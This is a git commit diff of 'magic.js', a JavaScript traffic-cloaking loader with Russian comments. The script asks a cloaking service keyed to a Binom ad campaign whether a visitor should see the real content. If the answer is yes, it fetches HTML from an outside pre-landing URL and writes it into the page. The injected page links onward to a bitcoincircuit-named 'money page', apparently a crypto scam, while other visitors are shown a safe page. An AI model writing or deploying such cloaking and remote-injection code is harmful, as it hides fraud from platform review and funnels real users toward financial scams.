90d667f180ce7f9cc2571bb5a0f24fbb21641bcd
Denis8854 <37094139+Denis8854@users.noreply.github.com>
2020-02-17 21:29:51 +0200

    Update magic.js

--- magic.js
+++ magic.js
@@ -1,9 +1,16 @@
-var binomCampaingKey = 's15yun0z67b7t9btickt'; 
-/* Key кампании в Binom. Не ID! Узнать key нужной кампании можно в настройках этой кампании. Вот здесь - http://prntscr.com/qua54o  */
+var binomCampaingKey = 's15yun0z67b7t9btickt'; /* Key кампании в Binom. Не ID! Узнать key нужной кампании можно в настройках этой кампании. Вот здесь - http://prntscr.com/qua54o  */
+var gitHubId = 'denis8854'; /*ID данного GitHub сайта. Только ID, не вся ссылка!*/
+var preLandingUrl = 'https://serd.site/landing/xhr/mobile_final/latam.php'; /*Адрес преленда, который необходимо подгрузить*/
+var moneyPageUrl = 'https://cl.bitcoincircuit.online'; /*Адрес манипейдж, который будет подставлен в ссылки на преленде*/
 
-/* БОЛЬШЕ НИЧЕГО НЕ МЕНЯТЬ! */
+/* 
+При необходимости можно заменить код формы/сейфпейдж, который заключен в function addContent (){...}
+БОЛЬШЕ НИЧЕГО НЕ МЕНЯТЬ!
+*/
 
-var url = 'https://cloak.site/processing/binom/?bckey='+binomCampaingKey;
+var preLanding = preLandingUrl + '?mpurl=' + moneyPageUrl + '&githubid=' + gitHubId; 
+
+var url = 'https://cloak.site/binom/?bckey='+binomCampaingKey;
 var xhr = new XMLHttpRequest();
 var cloakResult = 'no';
 
@@ -15,5 +22,16 @@ if (xhr.status == 200) {
 } 
 
 if(cloakResult=="yes"){
-  document.write('<script src="land.js" type="text/javascript"></script>');
+var xhrLand = new XMLHttpRequest();
+var landingCode = '';
+
+xhrLand.open('GET', preLanding, false);
+xhrLand.send();
+
+if (xhrLand.status == 200) {
+  landingCode = xhrLand.responseText;
+} 
+
+document.write(landingCode);
+
 }
